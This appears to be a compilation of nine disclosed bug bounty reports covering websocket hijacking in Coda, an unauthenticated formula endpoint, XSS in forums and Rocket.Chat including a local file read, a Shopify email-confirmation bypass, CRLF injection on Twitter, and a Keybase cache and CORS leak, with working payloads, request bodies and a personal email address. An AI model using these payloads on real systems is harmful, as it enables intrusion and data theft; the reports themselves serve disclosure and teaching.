1. Lack or Origin check leads to Cross-Site Websocket Hijacking (CSWSH)
@fisher discovered a CSRF-related vulnerability in Coda docs by which an attacked could craft a convincing page that would make modifications to a specific document without the victim knowing. This is due to the inherent nature of Websockets not being secure by default. Although a fully-working proof of concept was not provided, the Coda security team swiftly patched the vulnerability and rewarded a bounty for the creative attack.

We can check this very easily by using a custom extension e.g. Simple Websocket Client
â€¢	After installing an extension like the above, login in https://coda.io and open or create a new document while proxying requests through Burp
â€¢	Burp has a WebSocket history under Proxy, next to HTTP History. Select any of the URL's used, e.g: https://coda.io/documentsCollab/<docId>/collab/?params=PARAMS&connectionId=CONNECTIONID&EIO=3&transport=websocket
â€¢	Open the extension and use this URL(substitute https for wss) and press open:Immediately we connect and receive a message from the server, which confirms the lack of Origin check. Although the URL might first look like undecipherable to an attacker, the params parameter just holds a base64 value of the document ID: {"documentId":"DOCID"}
Since the document ID is sufficiently long, an attack scenario is:
â€¢	User (admin) invites attacker to collaborate on a document (view only)
â€¢	Attacker now knows the document ID. He prepares a CSWSH payload and embeds it in a malicious webpage and sends the link to the victim
â€¢	Victim opens the malicious page and is Cross Site Websocket Hijacked. The payload could e.g. delete or alter the contents of the document, introducing fake content.

Code = 

2. Use Github pack with Coda employee github account (search code of Coda's private repositories)
When you use the Github formula, the information from the Github API is returned by the endpoint https://coda.io/coda.CalcService/InvokeFormula. From what I understand, this endpoint expects a gRPC request. In the request is sent: the formula (Github..CodeSearch), the version of the Github pack (3.4.1), the id of the Github connection (generated by Coda when connecting your account), the id of the document to which the Github account is linked, and the parameters for the formula.
The issue is that you can take the document id and connection id of any public document and use the formula as you please. Also, it's not required to be authenticated to make a request to the endpoint https://coda.io/coda.CalcService/InvokeFormula. It may be working as designed, so that's why I used a document created by a Coda employee for the proof of concept in case that is considered a N/A report :D


Steps To Reproduce:
â€¢	Pass all requests through Burp or similar proxy to make the reproduction easier.
â€¢	Make sure you are signed in https://coda.io
â€¢	Go to https://coda.io/t/Git-Cherry-Pick-From-Branch_tTZJuuyHgqa/preview?useBack
â€¢	If you look at the requests in Burp, you will see a request to https://coda.io/embed/igvicDMruo?viewMode=gallery&disconnected=truethat is loaded in an <iframe> (it is the document you see when you load the template). "igvicDMruo" is the document id.
â€¢	Using the document id from the last step, go to https://coda.io/internalAppApi/documents/igvicDMruo/externalConnections
â€¢	The value that matters from the response is the id of the object with name "albertc44". The connection id is 7b167155-731e-4913-9091-729c5bd77ee0
â€¢	Go to https://coda.io/newdoc/POC
â€¢	Click "Create doc"
â€¢	Click the "Open Packs" button at the top right. It is the puzzle piece icon between the robot and the arrows
â€¢	Click "+ Add a new Pack"
â€¢	Click the "Github" card/box
â€¢	Click the orange "Sign in to install" button
â€¢	Click "Authorize codaprojectapp"
â€¢	Click "You and anyone this doc is shared with"
â€¢	Click "Nobody"
â€¢	Click the orange "+" button at the top of the document
â€¢	Go to "Formula", then "Github", and then click "CodeSearch"
â€¢	In the dialog opened press the key "Tab", enter comma ,, enter "secret", enter ,, enter organization: "kr-project" and finally press the key "Enter"
â€¢	In Burp Proxy or similar, find the last request to /coda.CalcService/InvokeFormula and send it to the Repeater or similar to modify
â€¢	Remove the Cookie header
â€¢	The value between $ and 2$ is the connection id. Replace this value with the 7b167155-731e-4913-9091-729c5bd77ee0 you got before (don't touch the 2 before the $ ðŸ˜… )
â€¢	The first ten characters of the last line are the document id. Replace it with the document id you got in the first steps (igvicDMruo)
â€¢	Send the request
â€¢	The most interesting things in the response are the values of Fragment








3.  RXSS to Stored XSS - forums.pubg.com | URL parameter
RenÃ© Kroka found a Reflected XSS vulnerability that could be chained to a Stored XSS attack in the Invision Community forums software used by PUBG.
By crafting a malicious URL the attacker is able to trigger Javascript to execute on their own page; known as Reflected XSS. The attacker then creates a new forum post, or modifies their forum profile. When a link is pasted into a forum post, or profile, the Invision software tries to embed the content into an iFrame to provide an enhanced user experience. An attacker can use a proxy to intercept the iframe as it loads, redirect it to their malicious URL, and trick the forums software into storing their XSS payload and displaying it to other users.
Invision Community fixed this issue in release 4.4.9.1 (https://invisioncommunity.com/release-notes/4491-r91/).
PUBG has upgraded to the latest version which resolved the issue for our installation.

4. 
XSS (leads to arbitrary file read in Rocket.Chat-Desktop)
Description: Rocket.Chat allows administrative users to customize the home body. Since <script> tags are removed, I think that running scripts should not be allowed. However, event handlers are not removed, allowing you to inject your own scripts.
Releases Affected:
â€¢	Rocket.Chat-Desktop-Client: v2.15.5
â€¢	Rocket.Chat-Server: v2.0.0
â€¢	Apps-Engine-Version: v1.5.2

Steps To Reproduce (from initial installation to vulnerability):
â€¢	Go to Administration Â» Layout Â» Content
â€¢	Set Home Body to <img src=0 onerror="alert(0)"/>
â€¢	Visit /home

Arbitrary file read in Rocket.Chat-Desktop
â€¢	Go to Administration Â» Layout Â» Content
â€¢	Set Home Body to <iframe src="file://c:/windows/system32/drivers/etc/hosts" onload="alert(iframe.contentDocument.body.innerHTML)" id="iframe"></iframe>
â€¢	Visit /home




5. Add store to new partner account without confirming email address.(Shopify)
When a someone signs up for a new account on partners.shopify.com they are asked to confirm their email address before they can do anything and by anything I mean add stores, invite members, use 
affiliate tools and so on. Apparently they can leverage an issue on partners.shopify.com to create stores on app.shopify.com without confirming their email address.
Setup
â€¢	A new test account on partners.shopify.com.
â€¢	Don't confirm email after signing up.
â€¢	A partner account ID - say 1234
â€¢	Shop name - say attacker

Step to reproduce.
â€¢	While logged in send the following to the server to obtain an access token GET /1234/stores/signup_object/dev_store  Host: partners.shopify.com
â€¢	You should get a request similar to {"extra":{"affiliate_shop":"eyJfcmFpbHMiOnsibWVzc2FnZSI6ImV5SndiR0Z1WDNOd1pXTWlPbn....."},"signup_source":"development shop","signup_types":["affiliate_shop"],"previous_page":"https://partners.shopify.com/1234/stores%22}
â€¢	Finally, to create the shop, do the following: POST /services/signup/create HTTP/1.1 Host: app.shopify.com .... <snipped> .... _orig_referrer=https%3A%2F%2Fpartners.shopify.com%2F1234%2Fstores%2Fnew%3Fstore_type%3Ddev_store _y=&ref=&ssid=&source=&source_url=&signup_code=&signup_source=development+shop&signup_source_details=build_store_for_client&forwarded_host=&signup_page=&signup_locale=&signup%5Bshop_name%5D=attacker&signup%5Bsubdomain%5D=&signup%5Bfirst_name%5D=&signup%5Blast_name%5D=&signup%5Bemail%5D=attacker%40domain.com&signup%5Bpassword%5D={shop-password-here}&signup%5Bconfirm_password%5D={shop_password_here}signup%5Baddress1%5D=Beverly+Hills&signup%5Bcity%5D=Los+Angeles&signup%5Bprovince%5D=CA&signup%5Bzip%5D=90210&signup%5Bcountry%5D=US&signup%5Bphone%5D=&signup%5Bpos%5D=&signup%5Bextra%5D%5Baffiliate_shop%5D={access_token_here}&signup%5Bextra%5D%5Borganization_id%5D=1234&signup%5Bextra%5D%5Bpartner_test_shop%5D=&signup%5Bsignup_types%5D%5B%5D=affiliate_shop


Note: Every occurrence of "1234" should be replaced with the partner account ID created above. In case you have troubles reproducing the issue I will be glad to help out.
â€ƒ
6.  JumpCloud API Key leaked via Open Github Repository.
Summary: Open Github Repo Leaking Starbucks JumbCloud API Key
My words :  a public repo of Starbucks which had a JumpCloud API  Key . Obtained a x-api-key







7. CLRF Injection 
https://ads.twitter.com was vulnerability to HTTP response splitting in the endpoint https://ads.twitter.com/subscriptions/mobile/landingthat allows to an attacker add a malicious header in the response headers.
PoC:
https://ads.twitter.com/subscriptions/mobile/landing?t=%0d%0aSet-Cookie:%20csrf_id=injection%3b

set new cookie
https://ads.twitter.com/subscriptions/mobile/landing?ref=gl-tw-tw-promote-mode?t=%0d%0aSet-Cookie:%20lang=crlf%3b
https://ads.twitter.com/subscriptions/mobile/landing?ref=gl-tw-tw-promote-mode?t=%0d%0aSet-Cookie:%20csrf_id=tested%3b





8.  Stripo.email reflected xss

hello securitty team tested windows 10 and firefox 69.0.3 (64 bit)
test url: <https://stripo.email//templates/merry-christmas-email-template-winter-inspiration-gifts-flowers-industry >
payload: %3E%22%27%3E%3Cscript%3Ealert%281578%29%3C%2Fscript%3E

Proof URL :
https://stripo.email//templates/merry-christmas-email-template-winter-inspiration-gifts-flowers-industry%3E%22%27%3E%3Cscript%3Ealert%281578%29%3C%2Fscript%3E

â€ƒ


9. SOP bypass using browser cache

An attacker has the ability to extract sensitive information from user's accounts, due to a CORS issue. On a minor note, this also is a cross-site leak as we can fingerprint what exact keybase user has accessed the attacker's website.

Information disclosed :
"passphrase_generation":4,"random_pw":false},
"invitation_stats":{"available":60,"used":40,"power":100,"open":0},
"profile":"emails":{"emails":[{"email":"x86sec@yahoo.ie","is_primary":1,"is_verified":1,"when_verified":"2016-03-08T22:44:39.000Z","visibility":1,"last_verify_email_date":null}],"primary":{"email":"x86sec@yahoo.ie","is_primary":1,"is_verified":1,"when_verified":"2016-03-08T22:44:39.000Z","visibility":1,"last_verify_email_date":null}},"billing_and_quotas":{"plan":{"plan_id":"b40ff8cf58afb4fa7e8dd4dc2c5f651a","plan_name":"BASIC","price_pennies":0,"gigabytes":250,"num_groups":0,"folders_with_writes":500,"billing_status":0,"test_mode":null},"usage","lks_server_half":"a42d3be100454cc98df58d90acd402af57e40119d6a02580edc47128454a47dc","passphrase_generation":4,"last_used_time":1566400369},"private_keys":{"all":{}}

I tested this on my own account, and while there is some serious information disclosure here, I am most concerned by "private_keys" field. I do not believe I have a private key stored on keybase.io however if it turns out that a private key is disclosed here for people that do, I believe this is near critical impact.

Issue Overview 
Users can interact with the following endpoint: https://keybase.io/_/api/1.0/user/lookup.json?username=%7Busername%7D to find information about other users such as public key etc. However, if they are signed in and lookup their own username, they are given some private data on themselves which is shown in the summary section (Email, stats, etc et al).

The CORS policy implemented here looks like this:
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET
Access-Control-Allow-Headers: Content-Type, Authorization, Content-Length, X-Requested-With
Access-Control-Allow-Credentials: false

â€ƒ
POC
1) Create the following payload locally (You don't have to host it anywhere for the sake of the PoC, since the server accepts a null origin). Replace the parameter value with your username and remove the braces.
<html>
<script>  
var url = "https://keybase.io/_/api/1.0/user/lookup.json?username={YOUR_USERNAME}";  
fetch(url, {    
    method: 'GET',    
    cache: 'force-cache'
    });
</script>
</html>
2) Login to your keybase account and perform some functionality such as encrypting a message to yourself etc. This will get cause the browser to cache this search endpoint
3) Notice in burp suite, the authenticated request with cookies to https://keybase.io/_/api/1.0/user/lookup.json?username=%7BYOUR_USERNAME%7D after performing the previous step. It will contain the sensitive information as mentioned in the summary. Now, remove those cookies in Burp's repeater and re-submit. You will notice this sensitive information is gone, since you're no longer authenticated to your own account. The content-length is reduced in the unauthenticated request.










